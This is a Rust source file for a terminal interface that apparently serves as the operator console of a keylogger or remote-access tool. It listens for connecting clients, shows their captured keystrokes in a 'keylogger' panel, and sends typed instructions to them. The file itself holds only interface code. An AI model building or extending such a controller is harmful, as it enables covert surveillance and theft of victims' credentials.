use std::net::{TcpStream, SocketAddr};

use color_eyre::Result;
use crossterm::event::{KeyCode, KeyEvent};
use ratatui::layout::{Constraint, Layout, Rect};
use ratatui::text::{Line, Span};
use ratatui::style::{Color, Style};
use ratatui::widgets::{Block, Borders, List, ListItem, Paragraph, Tabs};
use ratatui::{DefaultTerminal, Frame};

use crate::app::AppEvent::ClientConnected;

use super::Core;

pub enum AppEvent {
    Keylogger(String),
    Terminal(KeyEvent),
    ClientConnected(TcpStream, SocketAddr),
}

pub struct TabsState<'a> {
    pub titles: Vec<&'a str>,
    pub index: usize,
}

impl<'a> TabsState<'a> {
    pub const fn new(titles: Vec<&'a str>) -> Self {
        Self { titles, index: 0 }
    }
    pub fn next(&mut self) {
        self.index = (self.index + 1) % self.titles.len();
    }

    pub fn previous(&mut self) {
        if self.index > 0 {
            self.index -= 1;
        } else {
            self.index = self.titles.len() - 1;
        }
    }
}

pub struct App<'a> {
    _title: &'a str,
    input: String,
    tabs: TabsState<'a>,
    character_index: usize,
    messages: Vec<String>,
    instructions: Vec<String>,
    logged_keys: String,
    core: Core,
}

impl<'a> App<'a> {
    pub fn new(_title: &'a str) -> Self {
        Self {
            _title,
            input: String::new(),
            tabs: TabsState::new(vec!["Client", "Log", "Impl"]),
            messages: Vec::new(),
            instructions: Vec::new(),
            character_index: 0,
            logged_keys: String::new(),
            core: Core::new(),
        }
    }


    fn on_right(&mut self) {
        self.tabs.next();
    }

    fn on_left(&mut self) {
        self.tabs.previous();
    }

    fn move_cursor_left(&mut self) {
        let cursor_moved_left = self.character_index.saturating_sub(1);
        self.character_index = self.clamp_cursor(cursor_moved_left);
    }

    fn move_cursor_right(&mut self) {
        let cursor_moved_right = self.character_index.saturating_add(1);
        self.character_index = self.clamp_cursor(cursor_moved_right);
    }

    fn enter_char(&mut self, new_char: char) {
        let index = self.byte_index();
        self.input.insert(index, new_char);
        self.move_cursor_right();
    }

    fn byte_index(&self) -> usize {
        self.input
            .char_indices()
            .map(|(i, _)| i)
            .nth(self.character_index)
            .unwrap_or(self.input.len())
    }

    fn delete_char(&mut self) {
        let is_not_cursor_leftmost = self.character_index != 0;
        if is_not_cursor_leftmost {
            let current_index = self.character_index;
            let from_left_to_current_index = current_index - 1;

            let before_char_to_delete = self.input.chars().take(from_left_to_current_index);
            let after_char_to_delete = self.input.chars().skip(current_index);

            self.input = before_char_to_delete.chain(after_char_to_delete).collect();
            self.move_cursor_left();
        }
    }

    fn clamp_cursor(&self, new_cursor_pos: usize) -> usize {
        new_cursor_pos.clamp(0, self.input.chars().count())
    }

    const fn reset_cursor(&mut self) {
        self.character_index = 0;
    }

    fn submit_instructions(&mut self) {
        self.core.apply_instructions(self.input.clone()).unwrap();
        self.instructions.push(self.input.clone());
        self.messages.push(format!("handled instruction(-s): {}", self.input.clone()));
        self.input.clear();
        self.reset_cursor();
    }

    pub fn run(&mut self, terminal: &mut DefaultTerminal) -> Result<()> {
        terminal.draw(|frame| self.render(frame))?;

        self.messages.push(format!("[*] waiting for client connection ..."));
        self.core.start_terminal_key_events();
        self.core.start_tcp_listener();

        while let Ok(event) = self.core.receiver.recv() {
            match event {
                ClientConnected(stream, addr) => {
                    self.messages.push(format!("[*] client is connected from {}", addr));
                    self.core.start_client_reader(stream);
                },
                AppEvent::Terminal(key) => {
                    match key.code {
                        KeyCode::Enter => self.submit_instructions(),
                        KeyCode::Char(to_insert) => self.enter_char(to_insert),
                        KeyCode::Backspace => self.delete_char(),
                        KeyCode::Left => self.move_cursor_left(),
                        KeyCode::Right => self.move_cursor_right(),
                        KeyCode::Tab => self.on_right(),
                        KeyCode::BackTab => self.on_left(),
                        KeyCode::Esc => break,
                        _ => {}
                    }
                }
                AppEvent::Keylogger(key) => {
                    self.logged_keys.push_str(&key);
                },
            }

            terminal.draw(|frame| self.render(frame))?;
        };
        Ok(())
    }

    fn render(&mut self, frame: &mut Frame) {
        let chunks = Layout::vertical([Constraint::Length(3), Constraint::Min(0)]).split(frame.area());
        let tabs = self
            .tabs
            .titles
            .iter()
            .map(|t| Line::from(Span::styled(*t, Style::default().fg(Color::White))))
            .collect::<Tabs>()
            .block(Block::new().borders(Borders::ALL))
            .highlight_style(Style::default().fg(Color::LightBlue))
            .select(self.tabs.index);
        frame.render_widget(tabs, chunks[0]);

        match self.tabs.index {
            0 => self.draw_first_tab(frame, chunks[1]),
            1 => self.draw_second_tab(frame, chunks[1]),
            2 => self.draw_third_tab(frame, chunks[1]),
            _ => {}
        };
    }

    fn draw_first_tab(&mut self, frame: &mut Frame, area: Rect) {
        let chunks = Layout::vertical([
            Constraint::Fill(16), 
            Constraint::Fill(4),  
        ]).split(area);

        let user_screen = Paragraph::new("[<>] here should be user screen")
            .style(Style::default().fg(Color::White))
            .block(Block::bordered());
        frame.render_widget(user_screen, chunks[0]);

        let keylogger = Paragraph::new(format!("keylogger: {}", self.logged_keys))
            .style(Style::default().fg(Color::White))
            .block(Block::bordered());
        frame.render_widget(keylogger, chunks[1]);
    }

    fn draw_second_tab(&mut self, frame: &mut Frame, area: Rect) {
        let chunks = Layout::horizontal([
            Constraint::Fill(1),
        ])
        .split(area);

        let messages: Vec<ListItem> = self
            .messages
            .iter()
            .map(|m| {
                let content = Line::from(Span::raw(format!("{m}")));
                ListItem::new(content)
            })
            .collect();
        let messages = List::new(messages).block(Block::bordered());
        frame.render_widget(messages, chunks[0]);
    }

    fn draw_third_tab(&mut self, frame: &mut Frame, area: Rect) {
        let chunks = Layout::vertical([
            Constraint::Fill(4),  
            Constraint::Fill(4),  
            Constraint::Fill(4),  
            Constraint::Fill(4),  
        ]).split(area);
        
        let instructions = Paragraph::new(format!(">> {}", self.input.as_str()))
            .style(Style::default().fg(Color::White))
            .block(Block::bordered());
        frame.render_widget(instructions, chunks[0]);
    }
}
